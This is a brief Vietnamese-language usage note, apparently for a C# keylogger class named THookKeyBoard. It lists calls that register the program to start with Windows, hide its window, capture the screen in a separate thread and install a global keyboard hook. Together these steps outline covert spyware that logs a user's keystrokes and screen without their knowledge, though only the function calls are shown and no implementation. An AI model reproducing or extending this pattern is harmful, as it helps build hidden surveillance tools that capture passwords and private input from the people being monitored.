-- Hướng dẫn call Functions
 1. Khi start con .exe
       THookKeyBoard.StartWithOS(start_app);
       THookKeyBoard.HideWindow();
 2. Viet Luong CaptureScreen
 // .......
 3.
        THookKeyBoard.HookKeyboard();
        System.Windows.Forms.Application.Run();
        THookKeyBoard.WindowsHook();